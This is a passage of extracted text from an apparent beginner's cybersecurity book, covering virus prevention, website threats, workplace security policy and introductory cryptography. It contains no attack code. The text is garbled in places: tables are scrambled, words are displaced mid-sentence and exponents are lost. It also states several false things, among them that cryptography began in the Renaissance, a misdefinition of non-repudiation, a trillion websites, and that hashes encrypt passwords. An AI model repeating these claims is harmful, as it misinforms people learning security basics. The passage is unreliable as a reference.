which carries the worm  within the code  Slows  down  the  computer  network  of  the  user  by  overriding the network bandwidth as they reproduce  The Internet and Virus Previously,  viruses  spread  slowly  from  one  computer  system  to another  through  physical  media  such  as  a  floppy  disk.  However, since the advancement in technology, a lot of changes have taken place. Today, we don’t use the floppy disk in our computer system to transfer  information  from  one  system  to  another.  One  would  think that the spread of a virus should come to an end. However, that is farfetched because today, the internet serves as a medium through which viruses spread.  We  have  what  I  call  “conventional  virus,”  which  for  me  is  the danger  we  can  see  on  the  internet.  Conventional  viruses  are manipulating new ways of spreading their impact since their previous   means have been mitigated. Conventional viruses can be spread in two ways:    Innocent  virus  distribution  –  today,  the  internet  has made it easier to share software irrespective of where the individual  is  located.  However,  programs  found  online  can be  infected  with  a  virus.  Parasitic  file  viruses  operate perfectly in an environment that allows the sharing of files. Macro  viruses  are  common  on  the  internet;  additionally, they  don’t  just  attach  themselves  to  code  but  data,  which makes  it  harder  for  anyone  downloading  this  software  to avoid.     Malicious  virus  distribution  –  Another  way  of spreading  virus  on  the  internet  is  through  individuals  who spread  these  viruses  through  infected  programs.  Hackers, cybercriminals,  or  virus  creators  use  the  internet  as  the perfect spot to unleash their mayhem.  How to Prevent Computer Viruses So far, in this chapter, we have looked at what a virus can do to our  computer  system.  There  are  various  antivirus  available  online, which you can use to solve your virus problem. However, I want to show  you  important  ways  of  preventing  computer  viruses  and protecting your online privacy.  Importantly,  a  computer  virus  and  malware  are  not  the  same. While a computer virus is a program that replicates itself and affects files  and  programs,  malware  is  designed  to  deny  or  disrupt  the operation of a computer system. Furthermore, malware gain access to  your  system  resource  to  gather  relevant  information.  Most antivirus  programs  don’t  have  the  functionality  to  detect  and  deal with malware. In order to avoid any form of attack, it is important to adhere to these preventive methods to deal with a computer virus.     Update Your Computer Frequently  It  is  important  to  perform  automatic  updates  to  your computer programs because these updates come with security patches that deal with any likely security holes in your computer. I understand that updating a program can be painful as they pop up especially when you are working on an important program. It doesn’t matter how inconvenient they may be, it is significant to update them. Before a virus inconvenience you, it is preferable to put it in the right place.  Avoid using Internet Explorer  Today,  we  have  numerous  browsers  for  users  to  choose from.  You  can  choose  from  Firefox,  Chrome,  Opera,  or  Brava rather than using internet explorer.  Perform constant backup  You  do  not  need  anyone  to  tell  you  how  important  it  is  to backup  your  computer.  If  you  implement  a  quality  backup strategy, it will be hard for the virus to cause much hard for you. At times, the virus can affect your operating system and if you do  not  back  up,  you  end  up  losing  every  data.  Once  a  virus affects  your  operating  system,  the  best  suggestion  will  be  to reinstall  the  operating  system.  Therefore,  make  it  a  habit  to backup your computer.  Install premium antivirus  If  you  want  to  protect  your  data  and  improve  your  online privacy,  you  should  avoid  using  a  free  antivirus  program. Endeavor to buy a premium antivirus program and update their virus  program  and  definitions  regularly.  Some  of  the  effective antiviruses you can choose for your personal computer include Avira,  Kaspersky,  Bitdefender,  Avast  Pro,  Symantec  Norton, McAfee, and Webroot security anywhere antivirus   Scan Email or picture attachments –  If you are used to downloading attachments, try as much as possible  to  limit  such  downloads.  Hackers  can  hack  your account through your email; once they can do that, they can use the contact on your address for various malicious activities  Avoid any suspicious website  Today, we have more than a trillion websites available; it is paramount  to  be  careful  when  visiting  some  of  these  sites because you can’t tell if a picture contains malicious content or not.  Furthermore,  verify  the  website  before  visiting  it.  for instance, Microsoft.com is different from Microsoft.tisur.com  Staying out of trouble when you are using your computer network should be your priority. You have gone a step in the right direction by downloading this book to educate yourself. However, you must know that new viruses are released every day. While it may be hard to get perfect virus protection, following the few steps here can go a long to protect your data and online privacy.   Conclusion The aftereffect of a computer virus leaves regrets and damage to your computer system. Besides this, it costs thousands of dollars to get  everything  back  to  normal  if  it  does  not  reap  off  your  entire system. There are various viruses in existence with diverse ways of affecting your computer system.  However, everyone has a role to play in ensuring that his or her device  is  free  from  t  virus.  To  protect  your  computer,  you  should install  an  antivirus  program,  which  stores  malware  and  virus programs. Furthermore, endeavor to scan your computer frequently while avoiding the use of external hard disk as the situation may be. A  computer  virus  is  expensive  to  resolve.  This  doesn’t  include  the repair  time  you  have  to  invest  but  the  damages  to  your  data. Therefore,  keep  abreast  of  the  latest  security  tips  and  look  at  any signs of a virus to stay ahead of any imminent attack.   Chapter 6: Web Security and Workplace Security Guidelines  Web Security Websites are regrettably susceptible to security risks. If you are a website owner, it is at risk. This statement is not to scare the shit out of  you  but  to  enlighten  you  on  the  current  reality  we  are  facing. Recent statistics show that in a single day over 50,000 websites are compromised.  At  this  stage,  you  cannot  say,  “this  won’t  happen  to me” because it will surely get to you in a matter of time. What most small website owners think is that these hackers have bigger targets to  deal  with  and  do  not  have  any  reason  to  hack  their  site. Unfortunately, 43% of small businesses are victims of cybercrimes.  Globally,  about  54%  of  businesses  have  experienced  a  certain kind of cyber-attack, with only 38% readily prepared to handle these attacks.  Although,  I  lack  the  magic  crystal  ball  to  see  the  future; however, the threat to cybercrime will continually increase in years to come.  Notwithstanding,  you  must  take  the  necessary  steps  to expand your website security.  Web Security Threats There  are  various  ways  a  website  can  be  hacked.  We  have common threats to your web security, and every security-conscious individual must take necessary steps to avoid these threats. To help you, I have compiled possible security measures to take by avoiding these threats.    Spam  Normally,  people  see  spam  as  an  annoying  thing  because they are delivered to our mail. At times, we see that in our spam box  when  we  access  our  email.  Nevertheless,  some  of  these   spams are malicious and intentionally sent by hackers. Another common form of spam is a comment on most websites. Hackers have designed bots, which can bombard a comment section of a website containing links. These links direct the user to another site, which caves a way to build backlinks.        Malware and Viruses  Malware is a malicious software and the biggest threat to a website.  Amazingly,  these  cybercriminals  create  over  230,000 malware on a daily basis. The following statistics from Statista indicate the popular types of malware must cybercriminals use throughout the world.  Type of Malware Memory   Dumper  scraper Memory  Number of Encounters  %  16  Downloader Remote administration tool Injector Keystroke logger Bot Remote admin Installer Password utility Anti-analysis Ransomware Privilege escalation Reverse shell  14 9 9 8 7 6 5 5 5 4 4 4  From the table, you can see that malware is of different sizes and  shapes,  which  makes  that  a  bigger  threat  to  your  web security. These viruses normally access your server resources   or  private  data.  Criminals  use  ransomware,  malware,  and viruses  to  make  money  through  affiliate  links  and  add  by hacking into your website. If you are attacked by malware, your visitors  along  with  your  website  are  at  risk.  is  your responsibility  to  protect  your  users  and  prevent  them  from downloading any malicious file from your website.  It   WHOIS Domain Registration  Not  many  know  that  buying  a  domain  name  isn't  different from when you want to buy a house. Before the company sells the  house  to  you,  they  must  know  who  wants  to  buy  it  and  a possible  way  of  contacting  you.  This  information  becomes  a public record and available when the need arises.  Buying  a  domain  name  works  the  same  way.  However,  it depends on the particular country you reside in because certain information will be needed from you to record on WHOIS data. Besides your personal details, they may also require your URL nameservers.  Cybercriminals  can  this information to pinpoint your server location. with this information, they can have access to your webserver.  take  advantage  of         Denial-of-Service Attacks  These attacks aim at denying the user access to a specific website. Normally, these criminals use spoof IP address to load servers  with  traffic.  Through  this,  the  website  becomes  offline. Once  this  is  achieved,  the  host  must  find  possible  ways  to ensure the server is up and running. In the course of this, the host leaves the server open to potential attacks from malware, ransomware, or virus. Defense Strategy for Web Security   There  are  two  means  to  accomplish  perfect  web  security.  The first  involves  you  assigning  all  resources  required  to  sustain  a persistent alert to the latest security issues. This requires all updates and  patches  to  be  undertaken  once  with  all  existing  applications reviewed properly.  The second way of acquiring perfect web security is to utilize a web scanning solution to check your current applications, equipment, and  website  code.  This  will  help  you  to  see  if  there  is  any  known vulnerability in the system. In this situation, IPS IDS, antivirus, and firewalls are useful. However, the most efficient security investment you will have is website vulnerability and network scanning.  In  a  situation  where  you  have  to  choose  one  of  these  two strategies, then web scanning will provide a better level of website security than the latter option.  Steps to Keeping Your Website Safe Since  you  I  have  familiarized  you  with  the  likely  web  security threat  you  may  face,  it  is  important  to  proffer  ways  of  preventing these attacks. You have to deal with the assumption that the website is  secure  if  nothing  has  been  done  to  improve  its  security.  To improve your web security, there are necessary steps to take that will help  you.  If  you  want  to  protect  your  website,  then  you  should implement these steps.    Use HTTPS Protocol  Peradventure  your  websites  doesn’t  run  on  this  protocol, then you need to change that situation. This protocol tells your visitors that they are safe when they interact with your website. Additionally, they know their information is safe, and nobody can interrupt or change the content.  If your website doesn’t have the https protocol, it is prone to hackers,  who  can  alter  the  information  of  your  page  to  collect   sensitive  information.  For  instance,  they  can  steal  your  login information  and  those  of  your  users.  The  benefit  of  having  an https  protocol  is  that  it  doesn’t  just  secure  your  site  but  helps improve  your  search  ranking.  Interestingly,  Google  rewards people  with  this  protocol.  It  is  like  giving  your  child  sweet  for every good action they do.  Furthermore,  people  are  comfortable  to  visit  sites  with HTTPS  protocol  because  the  site  is  trustworthy  and  secure.  If you  want  to  super  protect  your  website,  you  can  combine HTTPS protocol with secure sockets layer  SSL  certificate. SSL is required if you run an e-commerce website because users will submit sensitive information such as names, address, and credit card numbers.  Although  using  an  SSL  certificate  is  a  good  preventive measure, it doesn’t prevent you from any likely attack. Instead, it encrypts  your  communication  between  the  browser  and  the server.  It  doesn’t  matter  if  you  are  not  using  an  e-commerce website, it is advisable to combine both the HTTPs protocol and SSL certificate.  Update Your Software and Applications If you are using an application or software on your site, you should ensure you update it constantly. If you use WordPress, you  need  to  update  the  plugins,  themes,  and  everything  that requires updating.  The reasons for these updates is to fix any glitches or bugs and  any  upgrades  or  improvement.  There  is  no  software  or application that is perfect. Cybercriminals are looking for means to  attack  unprotected  websites.  You  shouldn’t  leave  your  site vulnerable  because  most  cyber-attacks  are  automated.  These cybercriminals use a bot to scan sites, which are defenseless. Therefore,  keep  your  software  updated  to  its  latest  version  to avoid any potential attack.            Select a Secure Web-Hosting Plan  You will enjoy some level of protection if your host provider takes the security of its servers serious. However, this doesn’t happen  in  most  situations.  It  is  appealing  if  you  decide  to purchase  a  shared  hosting  plan  considering  the  price. Nevertheless, this might not be the best website security choice because you are sharing the servers with other website owners.  The  danger  of  this  option  is  that  if  a  particular  website  is attached by a virus, malware, or ransomware, your website isn’t exempted.  With  this,  these  hackers  can  have  access  to  your website through the shared server. Don’t get me wrong, I am not saying that using a shared hosting plan is wrong, but if you want to improve your website security, this is not the perfect option to consider.  Change Your Password  This  preventive  measure  cannot  be  overemphasized, considering  the  increasing  security  threats  within  the  last  five years.  It  is  not  enough  to  change  your  password  but  using  a combination  of  different  special  characters  including  “*&$@!”. What  most  people  do  is  to  use  the  same  password  for  every website they access. They have been using the same password for over ten years without changing it once.  It is good, but here is the danger. Let us assume you are a glutton that loves spicy food. You have this special website that you order your meals, which usually requires give reviews. You require an email address and password to drop your reviews. If for  one  reason  the  website  becomes  hacked  or  compromised, what happens to you? assuming you are using the same login details for every website you access including your own site and   the hackers discover this. What do you think will happen? With your  email  address  and  password,  they  can  access  your administrative setting, and that will be the rest of the story.     What next?  Your  web  security  shouldn’t  be  taken  lightly.  If  you  haven’t given any consideration to securing your website, then you are at risk while reading this. It is hardly possible for any website to remain 100% secure and safe because hackers aren’t sleeping. They  are  constantly  looking  for  new  ways  to  steal  information and attack websites. However, you can change the narrative by adhering to the above security measures. When these criminals have a hard time accessing your website, they don’t wait. They find new targets because you are well-equipped. Workplace Security Guidelines It is palpable now that office and organizational security is a top concern confronting our modern workplace. However, figuring ways of  building  an  all-inclusive  workplace  security  policy  looks unattainable for most managers and business owners, especially for individuals who aren’t conversant with various safety developments and  industry  jargon.  Luckily,  there  is  a  starting  point  if  we  use  the right tools. However, before the drafting of a workplace policy, it is essential  the  various  aspects  of  office  and organization security. After this, I can begin with the specifics, which include access control, physical security, and alarm systems.    to  understand   Understanding   the   Office   and  Organizational Security Policies To create a secure in our work environment, it is essential to have a workplace security policy. Irrespective of the size of your company, area of expertise, or the kind of business you do, your workplace  has  everything  to  benefit  when  there  is  a  clear   cybersecurity policy. This policy must shape the security goals of  the  organization,  including  its  internal  and  external  threats. Additionally, these policies must be enforced because they can help  avert  uncountable  security  challenges.  An  effective  policy will outline fundamental instructions, guidelines, and definitions, which are consistent throughout the organization. For instance, the  acceptable  password  to  use,  cyber  training  for  IT  staff, security  awareness  for  all  staff,  and  setting  appropriate procedures to guarantee both physical and digital security.  Digital Security  Improving  the  workplace  cybersecurity  serves  as  the  first step  to  protect  your  office  and  organization.  This  includes  the protection  of  data,  data,  and  the  non-physical  aspect  of  the workplace.  You  can  begin  by  securing  your  computer  and networks  by  buying  your  own  servers.  The  benefits  of  having your own server are great because it gives you the opportunity to  have  a  secured  network  and  protection  to  your  privacy  and data. Additionally, educating your employees is significant in the latest  digital  practices,  including  ways  of  avoiding  phishing emails and creating strong passwords for whatever account they use online.  Furthermore, with a good Wi-Fi network, you can keep your physical  security  systems  online.  This  means  you  are  always protected.  If  you  decide  to  invest  in  a  decent  access  control system, you need a dependable network, which will deliver your security  devices  the  capability  to  communicate  swiftly  and validate identities without any issues. Your workplace will have minimal  cybersecurity  challenges  if  you  set  up  your  digital security rightly.  Physical Security         including  anti-theft  measures,  safety   Undoubtedly, physical security is part of the major important part of workplace safety. It encompasses a big deal of different parts  regulations, protection against fires, etc. while digital security is important, at the workplace; physical security is the first defense line. Having a  comprehensive  physical  security  procedure  is  essential because  it  helps  reduce  insurance  claims,  closures,  liabilities, and  security  expenses  that  may  affect  your  business  or organization.  A  reliable  physical  security  policy  must  clearly outline identity authentication, employee access, alarm systems, and facility requirements as the case may be.  All  servers,  customer  data,  data  storage,  business  strategy document, client contract, and intellectual property is vulnerable to  damage  and  burglary  from  physical  threats.  Peradventure there is a fire outbreak or an intruder has access to your office, secured  files,  and  server  rooms,  your  computer  can  be compromised. This means your physical security policy is very vital  because  it  controls  your  amenities  and  assets.  The advantages  of  having  a  physical  control  policy  include  having fewer financial losses, reduced risk, protection of properties and staff,  and  recovery  in  the  event  of  an  accident.  Overall,  your physical security is a necessity even if it is not a luxury.     Access Control  Another  way  of  improving  your  office  and  organization security  is  through  the  implementation  of  an  access  control system.  Access  control  involves  managing  everything  that  is required  to  access  your  workplace  environment.  Although  it sounds  simple  and  you  may  think  about  how  that  relates  to cybersecurity?  Well,  if  your  network  server  is  exposed  and attackers  find  out,  you  stay  to  lose  your  sensitive  information. Importantly,  this  will  mean  bad  business  for  you  because  your clients  won’t  trust  you.  However,  once  you  set  up  a  good security  system  in  place,  every  facet  of  your  physical  security   can be managed, including the authentication of an employee, visitors’  access,  etc.  There  are  basically  five  stages  to  access control procedures, which include authorization, authentication, accessing,  management,  and  auditing.  The  processes, conditions,  and  criteria  of  these  different  stages  must  be implemented.   Chapter 7: Basic Concept of  Cryptography  In this chapter, I will introduce the concept of cryptography. The word shouldn’t instill any fear because it is quite easy to understand and  use  to  your  advantage.  Amazingly,  most  computer  security terms  have  straightforward  meaning  to understand.  However,  my  aim  in  this  chapter  is  to  help  you understand even the complicated terms and proffer solutions to your security based issues.  is  not  complex   that   Cryptography  is  an  act,  which  involves  encoding  messages  to make  them  hard  to  read.  Do  you  remember  the  illustration  I  gave concerning leaving in a glass house? Every passerby gets to see the content of your house. However, if it is built with brick and block, it will be hard for them to know what you have within your own.  In  the  olden  days,  cryptography  was  performed  using  manual methods.  Although  times  have  changed,  the  basic  framework  for performing cryptography hasn’t changed that much, in as much as there  has  been  a  notable  techniques. Importantly,  computers  have  these algorithms, thereby making the process more secure faster.  improvement  the  capability   in  to  perform   the   We have five functions of cryptography today. These include:     Authentication – This involves one proving its identity. It ensures  that  the  receiver  is  authorized  to  have  access  to the  information.  Cryptography  authentication  comprises  of two  variants  –  the  message  authentication  and  the  entity authentication.  The  message  authentication  identifies  the message originator without regarding any system or router that  sent  the  message.  However,  the  entity  authentication ensures that the information has been received.   Confidentiality privacy – Ensuring that the message sent is  for  the  intended  receiver  only  and  nobody  can  read  it. Confidentiality  that cryptography  provides.  from unauthorized individuals and can be gotten through various processes beginning from the use of physical techniques to mathematical algorithms.  is  an  essential  security  service  information   It  safeguards   Integrity – Guaranteeing the receiver that the content of the message is not tempered or changed in any way from the original message. An unauthorized person may alter the data  either  intentionally  or  accidentally.  However, cryptography helps to safeguard data integrity by detecting if a particular data have been manipulated or altered by an unauthorized individual.  Non-repudiation  –  a  mechanism  to  ascertain  that  the  receiver sent the message  Key  exchange  –  the  process  whereby  crypto  keys  are  shared between the receiver and the sender.  is   further  decrypted   In  cryptography,  we  normally  begin  with  the  unencrypted  data, which we call plaintext. The plaintext is then encrypted to ciphertext, which  into  usable  plaintext.  This  whole encryption  and  decryption  process  is  based  on  the  particular cryptography  scheme  implemented  along  with  the  key  used.  To make it easier, I will illustrate the encryption and decryption process using a formula to enable you to understand it clearer.  Let us assume that C represents ciphertext, P is plaintext, and k is  the  key  used,  while  E  and  D  are  the  encryption  and  decryption method, respectively.  C = Ek P     P = Dk C   When I am referring to two parties communicating, I will use the nickname Alice and Bob because it is a conversant terminology used in  the  cryptography  industry.  If  the  communication  involves  a  third   and fourth individual, then you may hear names like Carol and Dave. Furthermore, if during the communication, there is a malicious party, then I will call such party Mallory. A spy and a trusted third party will be  referred  to  as  Eve  and  Trent,  respectively.  If  you  are  clear  with these terms then we are ready to begin.  Do  not  forget  that  cryptography  mostly  deals  with  the  creation and development of mathematical algorithms to encrypt and decrypt messages. On the other hand, cryptology refers to the general study of secret writing, whereas cryptanalysis is the science of examining and breaking encryption.  Brief Evolution of Cryptography Early  cryptography  began  during  the  European  Renaissance. Different  Italian  and  Papal  states  helped  in  the  propagation  of cryptographic  techniques.  During  this  period,  various  inquiry  and attack  methods  were  studied  in  order  to  break  secret  codes.  One such improvement was the Vigenère coding, which came to limelight in  the  15th  century.  Furthermore,  in  the  19th  century,  more sophisticated  cryptography  approaches  were  discovered.  However, in the 20th century, came the invention of the electromechanical and mechanical  machines,  which  provided  an  efficient  and  advanced means  of  encrypting  information.  Finally,  during  World  War  II, cryptanalysis and cryptography became extremely mathematical.  With  various  advancements  taking  place  in  the  world,  military units,  corporate  bodies,  government  organizations,  and  security professionals are advocating and adopting the use of cryptography. Today,  most  organizations  are  using  cryptography  to  protect  their information and secrets from intruders or attackers.  Cryptographic Algorithms There are various ways of categorizing cryptographic algorithms; however,  in  this  book;  I  will  classify  them  based  on  the  number  of keys  used  in  implementing  the  encryption  and  decryption  process. Let us look at the three main types of algorithms.     Secret Key Cryptography Public Key Cryptography Hash Functions     Secret Key Cryptography  In  this  cryptographic  algorithm  method,  we  use  a  single  key  to implement  both  the  encryption  and  decryption  process.  In  the diagram  below,  you  will  observe  that  the  sender  of  the  message uses the key to encrypt the plaintext before sending the ciphertext to the receiver. In turn, the receiver uses the same key to decrypt the message before finding out the content of the message.    In this situation, the key serves both functions – encryption and decryption.  At  times,  secret  key  cryptography  is  called  symmetric encryption. In this cryptographic algorithm, the sender and receiver must  know  the  key  because  that  is  the  secret  to  the  message. However, the challenge of this particular approach is the way the key is  distributed.  Notwithstanding,  an  organization  depends  on  this approach,  especially  when  there  is  an  issue  of  privacy  and confidentiality.    Public Key Cryptography   In the cybersecurity industry, public-key cryptography is one of  the  significant  development  we  have  seen  in  cryptograph within  the  last  400  years.  Professor  Martin  Hellman  of  the Stanford  and  student  Whitfield  Diffie  were  the  first  to  publicly describe  the  public  key  cryptography  in  1976.  In  their  paper, they describe a two-key public system where the two-party can effectively  engage  through  an unsecured communication channel without any need of sharing a secret key.  in  secured  communication   Public  key  cryptography   the  existence  of mathematical functions or a one-way function, which is easier to compute. However, their inverse function is more complicated if you want to compete. Let’s look at the two examples below.  relies  on   Multiplication  vs.  Factorization  –  for  instance,  you want  to  calculate  the  product  of  the  following  two  prime numbers 3 and 7. It shouldn’t take you any time to perform this simple calculation. We know that the answer will be 21. Supposedly,  you  have  the  product  of  two  numbers  whose outcome is 21, and you want to find the prime factor of the number.  When  you  did  the  multiplication  of  the  two  prime numbers, it took you lesser time when compared to finding the two prime factors. The problem becomes bigger when you want to find the prime with numbers above 400.  Exponentiation vs. Logarithms – Assuming you want to calculate the number 5 to the 5th power. This won’t take your  time  as  all  you  have  to  calculate  is  55,  which  is equivalent to 3125. However, if you begin with the number 3125 and decides to find two integers, that will take you a long time.  The two examples may look inconsequential; however, they are  a  representation  of  the  functional  pairs  used  in  public-key         cryptography,  which  include  the  simplicity  of  multiplication  and exponentiation  against  the  difficulty  of  using  factorization  and logarithms respectively. The trick when it comes to using public- key  cryptography  is  to  find  a  trap  door.  Normally,  public-key cryptography  uses  two  different  keys  –  one  for  the  encryption and  another  for  the  decryption.  Most  users  use  public-key for  key  exchange,  authentication,  and  non- cryptography  repudiation.  Another  name  is asymmetric encryption.  for  public-key  cryptography      Hash Function  function   Message  digests  or  hash   is  a  cryptography technique that doesn’t use any key; rather, it uses a fixed-length hash  value,  which  is  computed  using  plaintext.  This  makes  it hard for the length or content of the plaintext to be recovered. This algorithm is used to offer a digital fingerprint of the content of  a  file.  It  helps  to  ensure  that  a  virus  or  an  intruder  hasn’t changed the content of the file. Most operating systems use the hash  function  to  encrypt  passwords,  which  further  provide  a mechanism to guarantee the reliability of the file content. Importance of Cryptographic Algorithm A major issue for most people is why do we have different types of  cryptographic  algorithms?  What  is  the  need  of  having  three different algorithms when we can use only one? The reason behind this  is  that  each  algorithm  is  optimized  for  a  specific  cryptographic application.  For  instance,  the  hash  function  algorithm  is  perfectly suited  for  guaranteeing  data  integrity  since  any  alternation  to  the content of the message will lead to the receiver calculating a hash value  that  is  different  from  that  placed  by  the  sender  during  the transmission of the message. Considering the fact that two different messages will not get the same hash value, there is a high level of confidence in data integrity.   On  the  other  hand,  secret  key  cryptography  is  well-suited  in cases  of  encrypting  messages,  which  provides  confidentiality  and privacy.  In  this,  the  sender  will  generate  a  session  key  for  the encryption  of  that  particular  message.  The  sender  will  need  that same session key to be able to decrypt the message effectively.  It   Modern Cryptography Today,  cryptography  is  the  cornerstone  of  communication  and computer  security.  foundation  upon  which  various mathematical  concepts  such  as  probability,  computational- complexity,  and  number  theory  are  based.  There  are  three  main characteristics of modern cryptography, which separates it from the approaches used in the olden days. To make it easier for you, I will present it in a tabular form.  the   is   Modern Cryptography  Classic  Cryptography  Operates on  based   traditional characters such as digits and letters directly The   technique on is  through security  This obscurity.  that  only means  parties the  involved  get  to know the particular coding  technique employed. Classic  cryptography requires  the  whole cryptosystem  in to order   Operates on the binary bit sequence  Modern cryptography depends on publicly known mathematical algorithms for information coding. However, secrecy only exists through a secret key. It is hard for intruders or attackers to get the original information since there is the absence of a secret key. Furthermore, the computational difficulty of algorithms makes it impossible for intruders to get the original information.  This requires the parties involved in private  communication to have the secret key.   communicate confidentially.  Cryptology is the study of cryptosystems, which is further divided into  two  branches,  namely  cryptanalysis,  and  cryptography.  Our focus  in  this  book  is  on  cryptography,  but  it  is  important  to understand  that  cryptanalysis  involves  the  art  and  science  of breaking ciphertext. Cryptography and cryptanalysis co-exist without anyone  being  distinctively  on  its  own.  However,  cryptography  as already indicated in the process of making a cryptosystem with the capability of offering information security effectively. It deals with the security  of  digital  data.  At  times,  cryptography  is  referred  to  the design of mechanisms that uses mathematical algorithms to provide essential information security services.  Cryptosystem This  involves  the  implementation  of  cryptographic  techniques along with their associated infrastructure to offer information security services.  Another  word  for  cryptosystem  is  cipher  systems.  In  this section, I will look at a simple model of a cryptosystem, which offers confidentiality  to  the  information  transmitted.  The  diagram  below shows the basic model of a cryptosystem.     The diagram above depicts a sender with the intention of sending sensitive  information  to  a  receiver  in  a  way  that  no  third  party  that intercepts the information in whatever channel can effectively extract the information. The primary objective of using a cryptosystem is to ensure that only the sender and receiver can decode the plaintext. Let us look at the element of a cryptosystem.  Elements of a Cryptosystem From the diagram, we have six basic elements of a cryptosystem,  which includes:    Plaintext  This is the data or information that must be protected during  the transmission process  Encryption algorithm  This  entails  the  mathematical  process  that  generates  the ciphertext for any encryption key and plaintext. In simple terms, it is an algorithm, which takes plaintext and transforms it into a ciphertext having an encryption key.  Ciphertext  The ciphertext is a scrambled version of the plaintext, which is generated through the encryption algorithm via an encryption key.  However,  the  ciphertext  is  not  protected  as  it  passes through various public channels. Individuals who have access to the  communication  channel  can  compromise  the  data  or information.           Decryption Algorithm   this  involves  the  mathematical  process,  which  generates  a distinctive  plaintext  for  any  decryption  key  or  ciphertext.  What the  decryption  algorithm  does  is  to  take  the  ciphertext  and decryption key as input before transforming it to plaintext.        Encryption key  Decryption key  the key is a value, which the sender must know in order to  access the information.  the key is a value, which the receiver must know  Types of Cryptosystem There  are  two  types  of  cryptosystems,  which  is  based  on  the encryption  and  decryption  process.  These  include  symmetric  key and asymmetric key encryption. The primary difference these types of a cryptosystem is the encryption and decryption key. However, for any  cryptosystem,  both  the  encryption  and  decryption  key  are closely related. It is essentially difficult to decrypt the ciphertext with the key that is unconnected to the encryption key.    Symmetric Key Encryption  In  this  kind  of  cryptosystem,  both  the  encryption  and decryption  process,  have  the  same  keys.  If  you  see  the  term symmetric  cryptography,  it  signifies  the  study  of  symmetric cryptosystems. Examples of symmetric key encryption methods include  BLOWFISH,  IDEA,  Triple-DES,  and  Digital  Encryption Standard  DES    Before 1970, various cryptosystems used the symmetric key encryption.  However,  its  relevance  today  is  very  high  and extensively  used.  There  are  indications  that  this  encryption process  has  come  to  stay  when  you  consider  its  advantages over the asymmetric key encryption. The advantage or features include:     Keys are constantly changed in order to stop any form  of attack on the system  Individuals  using  the  symmetric  key  encryption  must both have a common key if there must be an exchange of information  The  process  of  encryption  and  decryption  is  faster because  of  the  smaller  number  of  bits  used  by  the  key when compared to the asymmetric key encryption  To run a symmetric algorithm requires lower processing  power unlike the asymmetric key encryption  It requires a robust mechanism for the exchange of key  between the parties involved  In spite of these advantages, there are basically two challenges  to symmetric key cryptosystem. These include:    Trust issues  –  Considering  the  fact  that  both  receiver requires  an  the  same  key,   require   and  sender   it    unassailable  trust  between  the  two  parties.  For  instance, the receiver may lose the key to an authorized user without informing the sender.  Key  establishment  –  both  the  sender  and  receiver must agree to a secret key before any communication can take  place.  This  requires  a  safe  key  establishment mechanism for the process to be effective.  When you consider the two challenges I just mentioned, it is clear that they are a hindrance to modern-day communication. Nowadays, there  is  a  need  for  individuals  to  exchange  information  with  non- trusted and unfamiliar parties. Because of the restriction that exists between the sender and the receiver brought about the asymmetric key encryption schemes.   Asymmetric Key Encryption  This is the opposite of the symmetric key encryption that requires the  same  key  for  the  encryption  and  decryption  of  the  information. Asymmetric  key  encryption  uses  different  keys  for  its  encryption process.  In  as  much  as  the  keys  are  different,  the  encryption  and decryption  process  are  related  mathematically.  Therefore,  the retrieval  of  the  plaintext  using  decrypting  ciphertext  is  practicable. The  diagram  below  shows  the  illustration  of  the  asymmetric  key encryption process.    The  asymmetric  key  encryption  became  popular  in  the  20th century  to  deal  with  the  issues  of  pre-shared  encryption  keys between two communicating parties.  The features include:     Each user must have a different private and public key. Mathematically, the keys are related in the sense that while you  use  one  for  the  encryption,  the  other  is  used  for decrypting the ciphertext to its original plaintext.   There  is  a  need  to  place  the  public  key  in  a  public  repository.  While  the  public  and  private  keys  are  associated  with each  other,  it  is  not  practicable  to  find  one  from  another. This uniqueness is where the asymmetric system builds its strength  If the first person needs to send information to another person, the first person must acquire the public key of the second  person  from  the  repository,  then  encrypt  the information before transmitting it.  The second person uses his own private key to extract  the plaintext  asymmetric algorithm  It uses a higher processing computer power to run the  The  process  is  slower  because  of  the  number  of  bits  involved in the encryption process   Cryptosystem Attacks Today, businesses and our daily lives are information-driven. This has  generated  the  cry  for  improved  protection  of  vital  information from mischievous activities, including attacks and data manipulation. To give you an idea, I will expound on the various attack that your information  may  be  subjected  to  and  how  important  it  is  to  ensure you  avoid  such  an  attack.  These  attacks  on  your  information  can exist as a passive or active attack.    Passive Attacks  The  primary  motive  why  you  may  experience  a  passive attack  is  because  attackers  gain  unauthorized  access  to  your information. For instance, a passive attack action could include the  interception  and  eavesdropping  of  a  particular communication channel by an intruder.  In  nature,  the  attacks  are  passive  because  it  doesn’t  affect the  information  or  disrupt  the  communication  channel  used  in transmitting  the  information.  Most  times,  a  passive  attack  is seen  as  attackers  stealing  your  information.  The  primary difference  between  these  kinds  of  stealing  with  that  of  your physical goods is that your data or information remains in your possession.  If  someone  steals  your  phone,  you  have automatically lost it unlike you recovered it.  While  for  some,  stealing  their  phones  isn’t  a  big  deal,  you can’t  downplay  it  when  it  has  to  do  with  your  information.  It  is more  dangerous  than  stealing  any  physical  item  or  goods because the owner of the information may not know that his or her information has been compromised.   Active attacks  This  particular  attack  involves  the  alteration  of  information through  a  process  that  influences  the  original  information.  The following  examples  will  open  your  eyes  to  what  an  active  attack entails. This includes,    Altering  the  information  using  an  illegal  means  or  method  Initiating  an  unintended  or   information through various medium  illegal   transmission  of  Changing  an  authenticated  data  like  the  timestamp  or  originator’s name  Denying information access to legitimate users Illegal deletion of information or data  However, with cryptography, you can put a stop to these attacks because of the various techniques and tools available to implement   the cryptosystem.  it   is   further,   The Assumptions of Attackers important  Before  going   to  highlight  certain assumptions of these attackers. You will agree with me that before a criminal comes to your home, he may have assumed that you don’t have  an  alarm  system,  a  gun  or  any  protective  means  to  fight against him or her. The same is applicable to these attackers, who will do anything to steal your information. I don’t want to keep you in the  dark,  so  you  need  to  know  the  cryptosystems  environment. Furthermore, you must understand the attacker’s assumptions along with  the  environment  that  dictates  the  attacker’s  capabilities.  We have three basic assumptions concerning the environment and the capabilities of the attackers.    Information  about   the  Encryption  Scheme A  cryptosystem  design   cryptography algorithms-  is   founded  on   the   following  Proprietary  algorithms  –  in  this,  only  the  designers  and users of the system know about the algorithm details        Public algorithms – In this option, everyone knows the  details of the algorithm because it is in a public domain  When  it  comes  to  proprietary  algorithms,  the  security  of information is done through anonymity or obscurity. In the case of  private  algorithms,  they  may  be  less  strong  because  the development  process  is  undertaken  by  an  in-house  personal without an extensive investigation of any weakness. Additionally, they offer communication between a closed group only. Because            this,   they  are  not  perfectly  suitable   of  for  modern communication,  especially  in  areas  where  there  is  a  large number of both unknown and known entities communicating.  Therefore,   first  